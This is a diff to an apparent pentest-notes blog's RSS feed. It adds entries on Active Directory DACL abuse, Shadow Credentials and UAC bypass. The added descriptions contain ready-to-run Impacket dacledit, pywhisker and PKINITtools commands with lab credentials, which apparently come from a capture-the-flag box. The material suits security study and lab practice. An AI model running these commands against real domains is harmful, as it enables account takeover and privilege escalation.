@@ -590,11 +590,25 @@
       <description>Active Directory Certificate Services social.technet.microsoft.com&#xA;Active Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton&#xA;Abusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify&#xA;PS C:\ &amp;gt; .</description>
     </item>
     <item>
+      <title>Pentest - Active Directory - DACL</title>
+      <link>https://kdbed.github.io/posts/pentest_active_directory_dacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pentest_active_directory_dacl/</guid>
+      <description>Modifying DACLs Use Impacket:&#xA;1 python3 dacledit.py -action &amp;#39;write&amp;#39; -rights &amp;#39;WriteMembers&amp;#39; -principal &amp;#39;judith.mader&amp;#39; -target-dn &amp;#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&amp;#39; &amp;#39;certified.htb&amp;#39;/&amp;#39;judith.mader&amp;#39;:&amp;#39;judith09&amp;#39; (or impacket-dacledit).</description>
+    </item>
+    <item>
       <title>Pentest - Active Directory - DCSync</title>
       <link>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://kdbed.github.io/posts/pentest_active_directory_dcsync/</guid>
       <description>hacktricks - DCSync</description>
+    </item>
+    <item>
+      <title>Pentest - Active Directory - Shadow Credentials</title>
+      <link>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pentest_active_directory_shadow_credentials/</guid>
+      <description>Shadow Credentials pywhisker&#xA;Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:&#xA;1 python3 /opt/pywhisker/pywhisker.py -d &amp;#34;certified.htb&amp;#34; -u &amp;#34;judith.mader&amp;#34; -p &amp;#34;judith09&amp;#34; --target &amp;#34;management_svc&amp;#34; --action &amp;#34;add The output is a PFX cert that can be used to authenticate as the user. Get a TGT for the user with PKINITtools:&#xA;1 python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass &amp;#39;25nQ6mg4JUTeQEjjNRE2&amp;#39; management_svc.ccache This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with getnthash.</description>
     </item>
     <item>
       <title>Pentest - Active Directory - SID-History Injection</title>
@@ -609,6 +623,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://kdbed.github.io/posts/pentest_active_directory_skeleton_key/</guid>
       <description>hacktricks&#xA;netwrix</description>
+    </item>
+    <item>
+      <title>Pentest - Active Directory - UAC Bypass</title>
+      <link>https://kdbed.github.io/posts/pentest_active_directory_uac_bypass/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://kdbed.github.io/posts/pentest_active_directory_uac_bypass/</guid>
+      <description>Bypassing Windows UAC Mocking trusted directories</description>
     </item>
     <item>
       <title>Pentest - Active Information Gathering</title>
